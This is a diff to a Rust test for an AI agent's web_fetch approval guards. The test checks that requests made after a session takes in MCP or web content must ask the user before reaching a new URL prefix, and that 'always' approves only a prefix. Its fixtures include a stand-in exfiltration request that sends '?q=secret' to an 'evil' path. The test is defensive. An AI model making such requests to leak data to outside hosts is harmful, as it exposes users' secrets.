@@ -18,6 +18,7 @@ use marv_session::mcp_tools::McpToolAdapter;
 use marv_session::provenance::project_note;
 use marv_session::runner::{AlwaysScopes, tool_run_from};
 use marv_session::subagent::SubagentApprover;
+use marv_tools::web_fetch::{WebFetch, WebOptions};
 use marv_tools::{
     ApprovalRequest, Approver, Decision, Preview, Scope, ToolContext, ToolOutcome, ToolOutput, ToolRef, builtin_tools, run_tool,
 };
@@ -205,19 +206,36 @@ fn mesh_egress_is_default_deny_and_asks_once_tainted() {
 }
 
 /// **Web requests to a new URL prefix ask once tainted**; a prefix the user approved after the taint doesn't ask
-/// again. `web_fetch`'s preview and run are #5's.
+/// again, and "always" on a tainted request approves its prefix, never the whole site (marv-rs S6). Against a local
+/// server (the guards never fetch the internet), so the tool lets private addresses through.
+///
+/// Proven: removed `&& !prefix_approved` from `run_tool`'s `must_ask` → failed (an approved prefix asked again);
+/// made `web_fetch::url_prefix` return the origin → failed (a new prefix on the same site didn't ask); removed the
+/// `approve_prefix` call on "always" → failed.
 #[tokio::test]
-#[ignore = "needs #5 (web_fetch preview and run)"]
 async fn tainted_web_fetch_to_a_new_prefix_asks() {
+    let base = marv_guards::serve("ok", "text/plain");
+    let tools: Vec<ToolRef> = vec![Arc::new(WebFetch::new(WebOptions { allow_private: true, ..WebOptions::default() }))];
     let project = TempDir::new("web");
     let approver = Recorder::new(Decision::Yes);
     let ctx = ToolContext { yolo: true, approver: Some(approver.clone()), ..ToolContext::new(project.path()) };
     ctx.taint.mark(Provenance::Mcp);
-    ctx.taint.approve_prefix("https://docs.rs/");
-    run_tool(&call("web_fetch", json!({"url": "https://evil.example/?q=secret"})), &ctx, builtin_tools()).await;
+    ctx.taint.approve_prefix(&format!("{base}/docs/"));
+    run_tool(&call("web_fetch", json!({"url": format!("{base}/evil?q=secret")})), &ctx, &tools).await;
     assert!(approver.requests()[0].must_ask);
-    run_tool(&call("web_fetch", json!({"url": "https://docs.rs/regex"})), &ctx, builtin_tools()).await;
+    let under = run_tool(&call("web_fetch", json!({"url": format!("{base}/docs/regex")})), &ctx, &tools).await;
+    assert!(!under.result.is_error, "{}", under.result.output);
     assert_eq!(approver.requests().len(), 1, "an approved prefix asked again");
+
+    // "Always" while tainted: the prefix, not the site.
+    let always = Recorder::new(Decision::Always);
+    let ctx = ToolContext { yolo: true, approver: Some(always.clone()), ..ToolContext::new(project.path()) };
+    ctx.taint.mark(Provenance::Web);
+    run_tool(&call("web_fetch", json!({"url": format!("{base}/guide/a")})), &ctx, &tools).await;
+    run_tool(&call("web_fetch", json!({"url": format!("{base}/guide/b")})), &ctx, &tools).await;
+    assert_eq!(always.requests().len(), 1, "\"always\" didn't cover the prefix");
+    run_tool(&call("web_fetch", json!({"url": format!("{base}/other")})), &ctx, &tools).await;
+    assert_eq!(always.requests().len(), 2, "\"always\" covered the whole site");
 }
 
 /// **A `must_ask` request is never answered from "always"**: the session's remembered scopes answer everything else
